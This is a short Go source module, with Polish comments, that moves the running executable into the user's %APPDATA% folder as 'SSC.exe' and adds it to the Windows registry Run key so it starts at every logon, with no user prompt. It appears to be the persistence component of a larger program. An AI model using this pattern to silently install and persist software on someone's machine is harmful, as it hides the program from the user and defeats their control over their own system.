package modules

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
)

var new_app_name string = "SSC.exe"
var no_extention_app_name string = "SSC"

func AddtoAutostart() bool {
	// Przenieś plik wykonywalny do katalogu %APPDATA%
	success := MoveExecutable()
	if !success {
		return false
	}

	// Ścieżka do pliku wykonywalnego po przeniesieniu
	executablePath, err := getExecutablePath()
	if err != nil {
		return false
	}

	// Dodanie pliku wykonywalnego do autostartu w rejestrze
	cmd := exec.Command("reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", no_extention_app_name, "/t", "REG_SZ", "/d", executablePath, "/f")
	if err := cmd.Run(); err != nil {
		return false
	}

	return true
}

func MoveExecutable() bool {
	// Ścieżka do pliku wykonywalnego
	executablePath, err := os.Executable()
	if err != nil {
		return false
	}

	// Katalog %APPDATA%
	appDataDir := os.Getenv("APPDATA")
	if appDataDir == "" {
		return false
	}

	// Nowa ścieżka docelowa
	newExecutablePath := filepath.Join(appDataDir, new_app_name)

	// Przeniesienie pliku wykonywalnego do nowego miejsca
	err = os.Rename(executablePath, newExecutablePath)
	if err != nil {
		return false
	}

	return true
}

func getExecutablePath() (string, error) {
	// Katalog %APPDATA%
	appDataDir := os.Getenv("APPDATA")
	if appDataDir == "" {
		return "", fmt.Errorf("err")
	}

	// Ścieżka do pliku wykonywalnego po przeniesieniu
	return filepath.Join(appDataDir, new_app_name), nil
}
